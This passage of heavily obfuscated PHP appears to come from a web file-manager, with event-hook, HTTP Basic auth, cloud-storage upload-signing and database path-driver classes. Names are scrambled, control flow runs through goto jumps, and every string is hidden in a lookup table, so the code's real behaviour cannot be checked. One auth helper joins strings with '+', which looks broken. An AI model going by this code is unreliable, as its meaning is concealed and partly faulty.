self::$events[$F¿–ŒäÇ¦][] = array($DÈ™Æ—ÔÔ[1724] => $A÷¶ÂÏõ»Ñ, $DÈ™Æ—ÔÔ[1725] => $e’Ë•ãÊ¶, $DÈ™Æ—ÔÔ[1726] => 0); } public static function once($fÊƒƒëÅ­, $e·†óëê) { self::bind($fÊƒƒëÅ­, $e·†óëê, !0); } public static function unbind($Bô·îÍö°º, $c¿”¯¥éùÁ = false) { if (!$c¿”¯¥éùÁ) { self::$events[$Bô·îÍö°º] = array(); return; } $D–˜å›¬¥ = self::$events[$Bô·îÍö°º]; self::$events[$Bô·îÍö°º] = array(); if (!is_array($D–˜å›¬¥)) { return; } for ($bËÃ²Åà = 0; $bËÃ²Åà < count($D–˜å›¬¥); $bËÃ²Åà++) { if ($D–˜å›¬¥[$bËÃ²Åà][$_SERVER[Ö][1724]] == $c¿”¯¥éùÁ) { continue; } self::$events[$Bô·îÍö°º][] = $D–˜å›¬¥[$bËÃ²Åà]; } } public static function filter($bÔÕ°»‡, $a‡Ù‹Ç¢ãœ) { goto DŒìğÚã„; Fà´¬á·À“: for ($A¼ä³¯ìÔ = 0; $A¼ä³¯ìÔ < count($b¦óƒÚ·òÄ); $A¼ä³¯ìÔ++) { $FÑßŠÈí = $b¦óƒÚ·òÄ[$A¼ä³¯ìÔ]; if ($FÑßŠÈí[$f³ˆßÓßÑˆ[1725]] && $FÑßŠÈí[$f³ˆßÓßÑˆ[1726]] > 1) { continue; } self::$events[$bÔÕ°»‡][$A¼ä³¯ìÔ][$f³ˆßÓßÑˆ[1726]] = $FÑßŠÈí[$f³ˆßÓßÑˆ[1726]] + 1; $e‰„ìÄô¥ = self::apply($FÑßŠÈí[$f³ˆßÓßÑˆ[1724]], array($c¿ñ…›É×™)); if (gettype($e‰„ìÄô¥) == gettype($c¿ñ…›É×™)) { $c¿ñ…›É×™ = $e‰„ìÄô¥; } } return $c¿ñ…›É×™; goto fîÆ‡¢‚Ÿ; DŒìğÚã„: $f³ˆßÓßÑˆ =& $_SERVER[Ö]; $cÑÊ»ÍŞóÏ = self::$events; if (!isset($cÑÊ»ÍŞóÏ[$bÔÕ°»‡])) { return $a‡Ù‹Ç¢ãœ; } goto eâ—ÌñŠ±; eâ—ÌñŠ±: $b¦óƒÚ·òÄ = $cÑÊ»ÍŞóÏ[$bÔÕ°»‡]; $c¿ñ…›É×™ = $a‡Ù‹Ç¢ãœ; if (!is_array($b¦óƒÚ·òÄ) || count($b¦óƒÚ·òÄ) == 0) { return $c¿ñ…›É×™; } goto Fà´¬á·À“; fîÆ‡¢‚Ÿ: } public static function trigger($DˆĞ‰ë‘Şó) { goto Bê‘¾¾»¼Û; FŠõßÃñÌ: if (!isset($FÍß“³²»[$DˆĞ‰ë‘Şó])) { return $e»‰Ô‰Á®°; } $Cƒ‡•Ù–„• = $FÍß“³²»[$DˆĞ‰ë‘Şó]; if (!is_array($Cƒ‡•Ù–„•) || count($Cƒ‡•Ù–„•) == 0) { return $e»‰Ô‰Á®°; } goto fö‰Øçê»—; fö‰Øçê»—: $Eæ¶°§÷¿œ = func_get_args(); array_shift($Eæ¶°§÷¿œ); for ($B”‚¯ÄñâÎ = 0; $B”‚¯ÄñâÎ < count($Cƒ‡•Ù–„•); $B”‚¯ÄñâÎ++) { $fğÂ®Ôâ‘ = $Cƒ‡•Ù–„•[$B”‚¯ÄñâÎ]; if ($fğÂ®Ôâ‘[$aê®©ïÓÅ´[1725]] && $fğÂ®Ôâ‘[$aê®©ïÓÅ´[1726]] > 1) { continue; } if (defined($aê®©ïÓÅ´[1727]) && GLOBAL_LOG_HOOK) { write_log($DˆĞ‰ë‘Şó . $aê®©ïÓÅ´[1728] . $fğÂ®Ôâ‘[$aê®©ïÓÅ´[1724]], $aê®©ïÓÅ´[1729]); } self::$events[$DˆĞ‰ë‘Şó][$B”‚¯ÄñâÎ][$aê®©ïÓÅ´[1726]] = $fğÂ®Ôâ‘[$aê®©ïÓÅ´[1726]] + 1; $D´š¯Ñ´÷Ä = self::apply($fğÂ®Ôâ‘[$aê®©ïÓÅ´[1724]], $Eæ¶°§÷¿œ); if (defined($aê®©ïÓÅ´[1727]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $aê®©ïÓÅ´[1729]); if ($fğÂ®Ôâ‘[$aê®©ïÓÅ´[1726]] == 200) { $d‹Íê¯Éˆ = is_array($fğÂ®Ôâ‘[$aê®©ïÓÅ´[1724]]) ? json_encode_force($fğÂ®Ôâ‘[$aê®©ïÓÅ´[1724]]) : $fğÂ®Ôâ‘[$aê®©ïÓÅ´[1724]]; write_log($aê®©ïÓÅ´[1730] . $DˆĞ‰ë‘Şó . $aê®©ïÓÅ´[1731] . $d‹Íê¯Éˆ, $aê®©ïÓÅ´[1732]); } } $e»‰Ô‰Á®° = is_null($D´š¯Ñ´÷Ä) ? $e»‰Ô‰Á®° : $D´š¯Ñ´÷Ä; } goto E™Ü–®Ô•¬; E™Ü–®Ô•¬: return $e»‰Ô‰Á®°; goto cƒÍ¹Ñ¢‰è; Bê‘¾¾»¼Û: $aê®©ïÓÅ´ =& $_SERVER[Ö]; $FÍß“³²» = self::$events; $e»‰Ô‰Á®° = !1; goto FŠõßÃñÌ; cƒÍ¹Ñ¢‰è: } } class HttpAuth { public static function get() { $aã—ø•¹Œ =& $_SERVER[Ö]; $F¬Çİå¬÷Ø = $aã—ø•¹Œ[33]; $eù¨õòĞ‚ = $aã—ø•¹Œ[33]; if (isset($_SERVER[$aã—ø•¹Œ[1733]])) { $F¬Çİå¬÷Ø = $_SERVER[$aã—ø•¹Œ[1733]]; $eù¨õòĞ‚ = $_SERVER[$aã—ø•¹Œ[1734]]; } elseif (isset($_SERVER[$aã—ø•¹Œ[1735]])) { $A”²Íé„Æ˜ = $_SERVER[$aã—ø•¹Œ[1735]]; if (strpos(strtolower($A”²Íé„Æ˜), $aã—ø•¹Œ[1736]) === 0) { $c‚æ’»ë´İ = explode($aã—ø•¹Œ[4], base64_decode(substr($A”²Íé„Æ˜, 6))); $F¬Çİå¬÷Ø = isset($c‚æ’»ë´İ[0]) ? $c‚æ’»ë´İ[0] : $aã—ø•¹Œ[33]; $eù¨õòĞ‚ = isset($c‚æ’»ë´İ[1]) ? $c‚æ’»ë´İ[1] : 0; } } return array($aã—ø•¹Œ[531] => $F¬Çİå¬÷Ø, $aã—ø•¹Œ[892] => $eù¨õòĞ‚); } public static function error() { goto eÆª®Œ»ö‡; eÆª®Œ»ö‡: $E­à ¦´†Ï =& $_SERVER[Ö]; header($E­à ¦´†Ï[1737]); header($E­à ¦´†Ï[1738]); goto aêË‡Ñ„¢Ã; EŞîºÑœ‚¦: die; goto e½Š òê‹; aêË‡Ñ„¢Ã: header($E­à ¦´†Ï[1739]); header($E­à ¦´†Ï[1740]); header($E­à ¦´†Ï[1248]); goto EŞîºÑœ‚¦; e½Š òê‹: } public static function make($eÔ›È‘””›, $f½ô¶¡„×) { $E©š½‡÷“ =& $_SERVER[Ö]; return $E©š½‡÷“[1741] + base64_encode($eÔ›È‘””› . $E©š½‡÷“[4] . $f½ô¶¡„×); } } goto fò¨™´¢¢¤; E®Ç¬¯æ²È: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($CâÃï¥ù†µ) { parent::__construct($CâÃï¥ù†µ); $this->signatureVersion($_SERVER[Ö][196]); } public function uploadFormData($bŞ ‰ñ‡£¡, $E¼É×¤“¼Ÿ = 3600) { goto c‘ª—Û¦ÏŠ; eŒ¯èÅ„”ï: $E˜ƒìš = array($dõä§‡’¶Ğ[1088] => $e¤ÂÍ½Šœœ, $dõä§‡’¶Ğ[1089] => array(array($dõä§‡’¶Ğ[1090] => $bËØÊÈß×»), array($dõä§‡’¶Ğ[1091] => $this->bucket), array($dõä§‡’¶Ğ[1092], $dõä§‡’¶Ğ[1093], $dõä§‡’¶Ğ[33]), array($dõä§‡’¶Ğ[1094] => $e šÎ¢¸ä“), array($dõä§‡’¶Ğ[1095] => $D™ì£‘›ƒ), array($dõä§‡’¶Ğ[1096] => $this->accessKey), array($dõä§‡’¶Ğ[1097] => $AÑ¸Ùùì‹Á))); $E˜ƒìš = json_encode($E˜ƒìš); $Aê‹Ô…ˆÊ« = hash_hmac($dõä§‡’¶Ğ[214], $AÑ¸Ùùì‹Á, $this->secret); goto EĞ¿ÄŒÆİ‚; c‘ª—Û¦ÏŠ: $dõä§‡’¶Ğ =& $_SERVER[Ö]; $bËØÊÈß×» = $dõä§‡’¶Ğ[181]; $D™ì£‘›ƒ = $dõä§‡’¶Ğ[214]; goto dÄÚ±âŒø‹; EĞ¿ÄŒÆİ‚: $ešÈ”©¦ø… = sha1($E˜ƒìš); $f›®Ñœ§¢Î = hash_hmac($dõä§‡’¶Ğ[214], $ešÈ”©¦ø…, $Aê‹Ô…ˆÊ«); $a¿ğÇ½Õ’ = array($dõä§‡’¶Ğ[1090] => $bËØÊÈß×», $dõä§‡’¶Ğ[1094] => $e šÎ¢¸ä“, $dõä§‡’¶Ğ[1098] => base64_encode($E˜ƒìš), $dõä§‡’¶Ğ[1095] => $D™ì£‘›ƒ, $dõä§‡’¶Ğ[1096] => $this->accessKey, $dõä§‡’¶Ğ[1099] => $AÑ¸Ùùì‹Á, $dõä§‡’¶Ğ[1100] => $f›®Ñœ§¢Î, $dõä§‡’¶Ğ[165] => $this->getHost()); goto Bñ©´ÃŠò„; Bñ©´ÃŠò„: return $a¿ğÇ½Õ’; goto B“íë¶Í¯´; dÄÚ±âŒø‹: $e šÎ¢¸ä“ = $dõä§‡’¶Ğ[1086]; $e¤ÂÍ½Šœœ = gmdate($dõä§‡’¶Ğ[1087], time() + $E¼É×¤“¼Ÿ); $AÑ¸Ùùì‹Á = (string) time() . $dõä§‡’¶Ğ[67] . (string) (time() + $E¼É×¤“¼Ÿ); goto eŒ¯èÅ„”ï; B“íë¶Í¯´: } public function fileOutLink($EÔ­—£µÊ‹) { $aÔ¶ğ™Šè =& $_SERVER[Ö]; if (substr($EÔ­—£µÊ‹, 0, 7) == $aÔ¶ğ™Šè[1101]) { $EÔ­—£µÊ‹ = $aÔ¶ğ™Šè[1102] . substr($EÔ­—£µÊ‹, 7); } header($aÔ¶ğ™Šè[152] . $EÔ­—£µÊ‹); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($B¥Ô‰Ìß¹´) { $this->pathParse = $B¥Ô‰Ìß¹´; $this->model = Model($_SERVER[Ö][1103]); } public function getPath($f¬©Ô‘Ş‡Ä) { return trim($f¬©Ô‘Ş‡Ä, $_SERVER[Ö][8]); } public function pathFather($EŞÈã×ÔÎ) { $f½»¦¼ïÑ = $this->parse($EŞÈã×ÔÎ); $f½»¦¼ïÑ = $this->infoSimple($EŞÈã×ÔÎ); return $f½»¦¼ïÑ ? $f½»¦¼ïÑ[$_SERVER[Ö][457]] : !1; } public function getPathName($eÎì‚º¸Æè) { $AßËçòÄ„Ş = $this->infoSimple($eÎì‚º¸Æè); return $AßËçòÄ„Ş ? $AßËçòÄ„Ş[$_SERVER[Ö][28]] : !1; } public function getPathOuter($D°İ§­À¦Ş) { if (!$D°İ§­À¦Ş) { return $D°İ§­À¦Ş; } $bÇëÙˆ©·Ô = $this->parse($D°İ§­À¦Ş); return KodIO::make($bÇëÙˆ©·Ô[$_SERVER[Ö][363]]); } public function copyFolderFromIO($AÏºå‚Ÿ, $C…ŒÑ‰à›, $eºËñ–‡¤œ, $Cë¡ğÍ‡çÏ, $c·š¸ÁˆŞ) { $AÁäŞÜ¯´ = $this->model->copyFolderFromIO($AÏºå‚Ÿ, $C…ŒÑ‰à›, $eºËñ–‡¤œ, $Cë¡ğÍ‡çÏ, $c·š¸ÁˆŞ); return KodIO::make($AÁäŞÜ¯´); } public function isParentOf($Dì´‘ÛÉ×, $BÈ†µØ¼Ø) { return $this->model->isParentOf($Dì´‘ÛÉ×, $BÈ†µØ¼Ø); } public function mkfile($Añè¿ÊËÁñ, $Fè‰‡ê”×™ = '', $EÇ³çİŠƒÅ = REPEAT_RENAME) { $EÍÉİù˜”Å =& $_SERVER[Ö]; $bí¬ÈÚÉ‡ˆ = $this->parse($Añè¿ÊËÁñ); $Añè¿ÊËÁñ = $bí¬ÈÚÉ‡ˆ[$EÍÉİù˜”Å[363]]; for ($C´¦”ƒ°±ğ = 0; $C´¦”ƒ°±ğ < count($bí¬ÈÚÉ‡ˆ[$EÍÉİù˜”Å[1104]]); $C´¦”ƒ°±ğ++) { $Bİõİ¹ó„Š = $bí¬ÈÚÉ‡ˆ[$EÍÉİù˜”Å[1104]][$C´¦”ƒ°±ğ]; if ($C´¦”ƒ°±ğ == count($bí¬ÈÚÉ‡ˆ[$EÍÉİù˜”Å[1104]]) - 1) { $Añè¿ÊËÁñ = $this->model->mkfile($Añè¿ÊËÁñ, $Bİõİ¹ó„Š, $Fè‰‡ê”×™, $EÇ³çİŠƒÅ); break; } $Añè¿ÊËÁñ = $this->model->mkdir($Añè¿ÊËÁñ, $Bİõİ¹ó„Š, REPEAT_SKIP); } return $this->getPathOuter($Añè¿ÊËÁñ); } public function mkdir($EÈÃÍ…ä…£, $B¡¸¼Œèã» = REPEAT_SKIP) { $EñËêº¬¢µ =& $_SERVER[Ö]; $fÊ×˜§ÙŠ = $this->parse($EÈÃÍ…ä…£); $EÈÃÍ…ä…£ = $fÊ×˜§ÙŠ[$EñËêº¬¢µ[363]]; for ($d‘†ù¢µÚ = 0; $d‘†ù¢µÚ < count($fÊ×˜§ÙŠ[$EñËêº¬¢µ[1104]]); $d‘†ù¢µÚ++) { $aƒ¯·Ë¡çå = $fÊ×˜§ÙŠ[$EñËêº¬¢µ[1104]][$d‘†ù¢µÚ]; $EÈÃÍ…ä…£ = $this->model->mkdir($EÈÃÍ…ä…£, $aƒ¯·Ë¡çå, $B¡¸¼Œèã»); } return $this->getPathOuter($EÈÃÍ…ä…£); } public function copyFile($f êÈ¹…ì†, $EÊê’õâƒœ, $F²·èŠô = REPEAT_REPLACE) { $Dê´²¸†¢‡ =& $_SERVER[Ö]; $C–£ÂÌ³Ìè = $this->parse($EÊê’õâƒœ); $e¼ĞŞ¸ğİÌ = $this->model->copy($f êÈ¹…ì†, $C–£ÂÌ³Ìè[$Dê´²¸†¢‡[363]], $F²·èŠô, $C–£ÂÌ³Ìè[$Dê´²¸†¢‡[75]]); return $e¼ĞŞ¸ğİÌ ? $this->getPathOuter($e¼ĞŞ¸ğİÌ) : !1; } public function moveFile($BªŠ¹Ùáº, $FÀ‡ÖÔÕ†Ù, $dË¬Ÿ¥ˆÜŠ = REPEAT_REPLACE) { $aù¶Áæµ¹é =& $_SERVER[Ö]; $c¦²à– = $this->parse($FÀ‡ÖÔÕ†Ù); $f‹ˆ»ì×Œ = $this->model->move($BªŠ¹Ùáº, $c¦²à–[$aù¶Áæµ¹é[363]], $dË¬Ÿ¥ˆÜŠ, $c¦²à–[$aù¶Áæµ¹é[75]]); return $f‹ˆ»ì×Œ ? $this->getPathOuter($f‹ˆ»ì×Œ) : !1; } public function copy($d›¶à£·, $E®í©ó³çŞ, $EšëŸ„ñœä = REPEAT_REPLACE) { $eÎ˜¡˜š‘ = $this->parse($E®í©ó³çŞ); $BÑ®‚£¢ = $this->model->copy($d›¶à£·, $eÎ˜¡˜š‘[$_SERVER[Ö][363]], $EšëŸ„ñœä); return $BÑ®‚£¢ ? $this->getPathOuter($BÑ®‚£¢) : !1; } public function move($Cšã…À×„ù, $EÅæÁËˆ°ï, $bô¸äĞŒÖÉ = REPEAT_REPLACE) { $b¶Ê‚ã¢‰ß = $this->parse($EÅæÁËˆ°ï); $d–ñËÙ’Ú = $this->model->move($Cšã…À×„ù, $b¶Ê‚ã¢‰ß[$_SERVER[Ö][363]], $bô¸äĞŒÖÉ); return $d–ñËÙ’Ú ? $this->getPathOuter($d–ñËÙ’Ú) : !1; } public function remove($AçÈÏ­Œ²Í, $E­·êÍßÕ = true) { return $this->model->remove($AçÈÏ­Œ²Í, $E­·êÍßÕ); } public function rename($Bóø±ôåì¬, $D‰ã™ó¸è×) { $a‚Ô¥¿óÂ´ = $this->model->rename($Bóø±ôåì¬, $D‰ã™ó¸è×); return $a‚Ô¥¿óÂ´ ? $this->getPathOuter($Bóø±ôåì¬) : $a‚Ô¥¿óÂ´; } public function size($d˜ğ…ŠÎöÔ) { $cÁñ®˜‚¨à = $this->infoSimple($d˜ğ…ŠÎöÔ); return $cÁñ®˜‚¨à ? $cÁñ®˜‚¨à[$_SERVER[Ö][77]] : 0; } public function infoSimple($a„Åº¹²”‚) { return $this->model->sourceInfo($a„Åº¹²”‚); } public function info($FÎ”Æ¤Ö¼Ä) { return $this->infoParse($FÎ”Æ¤Ö¼Ä); } public function infoAuth($FËØİÑÛ×‡) { return $this->infoParse($FËØİÑÛ×‡, !1, !0); } public function infoWithChildren($bö¾´°›èÌ) { return $this->infoParse($bö¾´°›èÌ, !0); } protected function infoParse($aÈ‡Ğ²±ä±, $C­‹Ñ‘Ç¾ = false, $bø«Ğ¦¡å© = false) { if (!$C­‹Ñ‘Ç¾) { return $this->model->pathInfo($aÈ‡Ğ²±ä±, $bø«Ğ¦¡å©); } return $this->model->pathInfoMore($aÈ‡Ğ²±ä±); } public function infoFull($fš¹ÛŠ¥) { $f¬¯µŸÃ’Æ =& $_SERVER[Ö]; $AÅ¨ˆ¾ˆ = explode($f¬¯µŸÃ’Æ[8], $fš¹ÛŠ¥); $aŠ¨™´ = implode($f¬¯µŸÃ’Æ[8], array_splice($AÅ¨ˆ¾ˆ, 1)); return $this->model->pathInfoByPath($AÅ¨ˆ¾ˆ[0], $aŠ¨™´); } public function hashSimple($cõğë›ÀÇ) { $b¹à¸’Ôâ¦ =& $_SERVER[Ö]; $cšÏîÄÚ• = $this->infoWithChildren($cõğë›ÀÇ); return $cšÏîÄÚ•[$b¹à¸’Ôâ¦[158]][$b¹à¸’Ôâ¦[160]]; } public function hashMd5($BÜãŠËù) { $eà¢Ş“’ =& $_SERVER[Ö]; $c·Ì†ò‹½Ô = $this->infoWithChildren($BÜãŠËù); return $c·Ì†ò‹½Ô[$eà¢Ş“’[158]][$eà¢Ş“’[159]]; } public function exist($F“´‘™ö†) { $BÔƒÙòÄï =& $_SERVER[Ö]; $D¼÷ÅäáŸ = $this->parse($F“´‘™ö†); if (!$D¼÷ÅäáŸ[$BÔƒÙòÄï[75]]) { return $this->isFile($F“´‘™ö†) || $this->isFolder($F“´‘™ö†); } $cñè§¥¢… = array($BÔƒÙòÄï[364] => $D¼÷ÅäáŸ[$BÔƒÙòÄï[363]], $BÔƒÙòÄï[28] => $D¼÷ÅäáŸ[$BÔƒÙòÄï[75]]); $EÔ¡ˆÀ–½ = $this->model->where($cñè§¥¢…)->find(); return $EÔ¡ˆÀ–½ ? !0 : !1; } public function isFile($f÷Ş¼ô«¬Ù) { $B¾íÜª‰ =& $_SERVER[Ö]; $E‘çÓ›äè = $this->infoSimple($f÷Ş¼ô«¬Ù); return $E‘çÓ›äè && $E‘çÓ›äè[$B¾íÜª‰[366]] == $B¾íÜª‰[83] ? !1 : !0; } public function isFolder($B…ÛøÅíï’) { $a¹×è›‡÷ =& $_SERVER[Ö]; $BºÃ‘¨©Ô = $this->infoSimple($B…ÛøÅíï’); return $BºÃ‘¨©Ô && $BºÃ‘¨©Ô[$a¹×è›‡÷[366]] == $a¹×è›‡÷[83] ? !0 : !1; } public function listPath($dÃšëÊ’œ—, $e°Æá…¨È¡ = false) { $b¦¼¬¢¶Öˆ =& $_SERVER[Ö]; if ($dÃšëÊ’œ— == $b¦¼¬¢¶Öˆ[33]) { return !1; } $cæÒù­ÇÀ  = array($b¦¼¬¢¶Öˆ[364] => $dÃšëÊ’œ—); if ($e°Æá…¨È¡) { return $this->model->listSource($cæÒù­ÇÀ , -1); } return $this->model->listSource($cæÒù­ÇÀ ); } public function has($a°Š”ŒŒ×Ú, $bŸ¬ë§„›• = false, $aõß“¢İ› = null) { $A±™”õ„İ¢ =& $_SERVER[Ö]; $EÜ™ö¦Ëˆ© = $this->infoWithChildren($a°Š”ŒŒ×Ú); if ($bŸ¬ë§„›•) { return array($A±™”õ„İ¢[188] => $EÜ™ö¦Ëˆ©[$A±™”õ„İ¢[188]], $A±™”õ„İ¢[187] => $EÜ™ö¦Ëˆ©[$A±™”õ„İ¢[187]]); } return $aõß“¢İ› ? $EÜ™ö¦Ëˆ©[$A±™”õ„İ¢[188]] : $EÜ™ö¦Ëˆ©[$A±™”õ„İ¢[187]]; } public function listAll($E†İâİìª•) { $dñ›ØÖÌÕ = IO::info($this->pathParse[$_SERVER[Ö][75]]); if (!$dñ›ØÖÌÕ) { return array(); } return $this->model->listAll($E†İâİìª•); } public function getContent($DÖ‹†‰íÀ±) { return $this->model->getContent($DÖ‹†‰íÀ±); } public function setContent($E¡Ï‘µ„, $CßœœØ¶ã = '') { return $this->model->setContent($E¡Ï‘µ„, $CßœœØ¶ã); } public function fileSubstr($AÛ…‡ªøÚ·, $e¢÷•—‡•, $B¨Œ‹÷É ½) { return $this->model->fileSubstr($AÛ…‡ªøÚ·, $e¢÷•—‡•, $B¨Œ‹÷É ½); } public function download($b·„Ûè›ìã, $F‡İ¥ˆÅÁ˜ = '') { $dÀÈ ±Æ Á = get_path_father($F‡İ¥ˆÅÁ˜); $fÀÔ„‡«êŸ = get_path_this($F‡İ¥ˆÅÁ˜); $CÛ¡Ò¿Í— = $this->model->fileInfoGet($b·„Ûè›ìã); $A÷”¢îŸ©½ = IO::copy($CÛ¡Ò¿Í—[$_SERVER[Ö][75]], $dÀÈ ±Æ Á, !1, $fÀÔ„‡«êŸ); return $A÷”¢îŸ©½; } public function upload($AÁ°çÙ™Ç„, $FíÑ’š°Ó©, $fÇãİ£‡„ = false, $d—×«ÈÏ›º = REPEAT_REPLACE) { $fˆƒòîª =& $_SERVER[Ö]; $AôÂôÉÏŒô = $this->parse($AÁ°çÙ™Ç„); $d„É¤Ÿõ² = $this->model->addFile($AôÂôÉÏŒô[$fˆƒòîª[363]], $FíÑ’š°Ó©, $AôÂôÉÏŒô[$fˆƒòîª[75]], $fÇãİ£‡„, $d—×«ÈÏ›º); return $this->getPathOuter($d„É¤Ÿõ²); } public function uploadFileByID($BÔ˜¸é†¸», $fÉ–ƒ·Ó, $dŠ²«©ÛâÔ) { $BŒãÚ°œø =& $_SERVER[Ö]; $bÁ© Ó«Õ = $this->parse($BÔ˜¸é†¸»); $a±Ê³Œìğ = $this->model->addFileByFileID($bÁ© Ó«Õ[$BŒãÚ°œø[363]], $fÉ–ƒ·Ó, $bÁ© Ó«Õ[$BŒãÚ°œø[75]], $dŠ²«©ÛâÔ); return $this->getPathOuter($a±Ê³Œìğ); } public function addFileByRemote($c„Î‚°÷Œ„, $Bê¼öĞÙ¥Ô, $EùÈğ²ÚÊ = array(), $A¦òÀï•Á = '', $FÍÍƒÈîÂ—) { $F÷òŸ¸²®è =& $_SERVER[Ö]; $C¬òºÏ¥ƒù = $this->parse($c„Î‚°÷Œ„); $A¦òÀï•Á = empty($A¦òÀï•Á) ? $C¬òºÏ¥ƒù[$F÷òŸ¸²®è[75]] : $A¦òÀï•Á; $e˜¯‘ØîĞ = $this->model->addFileByRemote($C¬òºÏ¥ƒù[$F÷òŸ¸²®è[363]], $Bê¼öĞÙ¥Ô, $A¦òÀï•Á, $EùÈğ²ÚÊ, $FÍÍƒÈîÂ—); return $this->getPathOuter($e˜¯‘ØîĞ); } public function uploadLink($bµµÖ‰Ù÷Ô, $fùÏ…ŠÖô¬ = 0) { $c¶“ùŸğ§ =& $_SERVER[Ö]; $f±ÜÔÏ•×Î = $this->parse($bµµÖ‰Ù÷Ô); $bµµÖ‰Ù÷Ô = Model($c¶“ùŸğ§[540])->createFileName($f±ÜÔÏ•×Î[$c¶“ùŸğ§[75]]); $a¸µƒšõ–Í = IO::uploadLink($bµµÖ‰Ù÷Ô, $fùÏ…ŠÖô¬); return $a¸µƒšõ–Í; } public function fileNameAuto($CäÔÌ±ÛåŸ, $a··‚–Ò…Ù, $Bß´Œôˆğ = REPEAT_REPLACE, $B…İó¢‚è = false) { return $this->model->fileNameAuto($CäÔÌ±ÛåŸ, $a··‚–Ò…Ù, $Bß´Œôˆğ, $B…İó¢‚è); } public function fileNameExist($EÉÛäÏ§Äë, $C§­÷öÜ²‡) { return $this->model->fileNameExist($EÉÛäÏ§Äë, $C§­÷öÜ²‡); } protected function _fileOut($Aâéô ¸, $càÏÜ¸“– = false, $dø„˜Ü¾Œ = false, $F¶£¸ø¬Ç = '', $eÂÛ˜Ù³ = false) { goto cäãÛ××†Ú; A‘È¼©¤¾è: if ($eÂÛ˜Ù³) { return IO::fileOutServer($fÂ»È§ Ÿƒ[$F¼ÑñÇæšà[75]], $càÏÜ¸“–, $C—¶öæÑÔÒ, $F¶£¸ø¬Ç); } IO::fileOut($fÂ»È§ Ÿƒ[$F¼ÑñÇæšà[75]], $càÏÜ¸“–, $C—¶öæÑÔÒ, $F¶£¸ø¬Ç); goto C®«Ö©Ÿ¶; bˆ¿É¤Ÿé—: $fÂ»È§ Ÿƒ = $this->model->fileInfoGet($Aâéô ¸); $F¶£¸ø¬Ç = $fÂ»È§ Ÿƒ[$F¼ÑñÇæšà[159]] ? $fÂ»È§ Ÿƒ[$F¼ÑñÇæšà[159]] : $F¶£¸ø¬Ç; $C—¶öæÑÔÒ = isset($GLOBALS[$F¼ÑñÇæšà[1106]]) ? $GLOBALS[$F¼ÑñÇæšà[1106]] : $då‰ÇŠµƒ¼[$F¼ÑñÇæšà[28]]; goto A‘È¼©¤¾è; cäãÛ××†Ú: $F¼ÑñÇæšà =& $_SERVER[Ö]; $då‰ÇŠµƒ¼ = $this->model->sourceInfo($Aâéô ¸); if ($då‰ÇŠµƒ¼[$F¼ÑñÇæšà[366]] == $F¼ÑñÇæšà[83]) { header($F¼ÑñÇæšà[1105]); die; } goto bˆ¿É¤Ÿé—; C®«Ö©Ÿ¶: } public function fileOut($b¾ ‡Â×, $C­âà‡÷Ùè = false, $a“šµÊÅÊƒ = false, $dñ‘âŸ = '') { $this->_fileOut($b¾ ‡Â×, $C­âà‡÷Ùè, $a“šµÊÅÊƒ, $dñ‘âŸ); } public function fileOutServer($DòôÈ¯„º‰, $cÏ˜ˆÊê¾ = false, $aéì†±èãâ = false, $bèâ¤Éªô­ = '') { $this->_fileOut($DòôÈ¯„º‰, $cÏ˜ˆÊê¾, $aéì†±èãâ, $bèâ¤Éªô­, !0); } protected function _fileOutImage($b‰ë÷¹Ô¦, $B³Õ›ï“‰ = 250) { $Bêñ®˜óŠé =& $_SERVER[Ö]; $dğ¤Î˜ì«… = $this->model->sourceInfo($b‰ë÷¹Ô¦); if ($dğ¤Î˜ì«…[$Bêñ®˜óŠé[366]] == $Bêñ®˜óŠé[83]) { show_json($Bêñ®˜óŠé[1107] . $b‰ë÷¹Ô¦, !1); } $GLOBALS[$Bêñ®˜óŠé[1106]] = $dğ¤Î˜ì«…[$Bêñ®˜óŠé[28]]; $CôƒíÆ¯óö = $this->model->fileInfoGet($b‰ë÷¹Ô¦); IO::fileOutImage($CôƒíÆ¯óö[$Bêñ®˜óŠé[75]], $B³Õ›ï“‰); } public function fileOutImage($cµ¾÷ƒ¦×ì, $e”³”³ÎÉÕ = 250) { $this->_fileOutImage($cµ¾÷ƒ¦×ì, $e”³”³ÎÉÕ); } public function fileOutImageServer($C‰¼Âö¾’±, $BÜå–Æ¸ˆŠ = 250) { $this->_fileOutImage($C‰¼Âö¾’±, $BÜå–Æ¸ˆŠ); } public function link($Eîˆ§Â—ÔÅ, $a›‚‡¤« = '') { $Aã²™£ªô‰ = $this->model->fileInfoGet($Eîˆ§Â—ÔÅ); return IO::link($Aã²™£ªô‰[$_SERVER[Ö][75]], $a›‚‡¤«); } protected function parse($d©ØÙ”—ä) { $d³µ¬¦ëÛÄ =& $_SERVER[Ö]; if (strstr($d©ØÙ”—ä, $d³µ¬¦ëÛÄ[8]) === !1) { return array($d³µ¬¦ëÛÄ[381] => intval($d©ØÙ”—ä), $d³µ¬¦ëÛÄ[75] => $d³µ¬¦ëÛÄ[33], $d³µ¬¦ëÛÄ[1104] => array()); } $AÒ”¹¡›» = explode($d³µ¬¦ëÛÄ[8], trim($d©ØÙ”—ä, $d³µ¬¦ëÛÄ[8])); if (count($AÒ”¹¡›») < 2) { show_tips($d©ØÙ”—ä . $d³µ¬¦ëÛÄ[1108]); } return array($d³µ¬¦ëÛÄ[381] => intval($AÒ”¹¡›»[0]), $d³µ¬¦ëÛÄ[75] => $AÒ”¹¡›»[1], $d³µ¬¦ëÛÄ[1104] => array_slice($AÒ”¹¡›», 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($cÑÈÔ¶Ô) { $this->pathParse = $cÑÈÔ¶Ô; $this->model = Model($_SERVER[Ö][1103]); } public function getPathOuter($dÈŒ‘Œ³’Æ) { $CõÊóÈ÷ï =& $_SERVER[Ö]; if (!$dÈŒ‘Œ³’Æ) { return $dÈŒ‘Œ³’Æ; } $EÒÙ¸õ…Œ« = $this->parse($dÈŒ‘Œ³’Æ); return trim(KodIO::makeShare($this->pathParse[$CõÊóÈ÷ï[363]], $EÒÙ¸õ…Œ«[$CõÊóÈ÷ï[363]]), $CõÊóÈ÷ï[8]); } protected function infoParse($Eì²Æ¹¡ŸÌ, $C”å‚¾åÓ¸ = false, $CôÉØ¦ÊÛí = false) { $bíƒ¤†¬é =& $_SERVER[Ö]; $fØ‹ìÉ®Ó§ = $this->pathParse[$bíƒ¤†¬é[363]]; $D¥À©î¡´¬ = trim($this->pathParse[$bíƒ¤†¬é[1004]], $bíƒ¤†¬é[8]); return 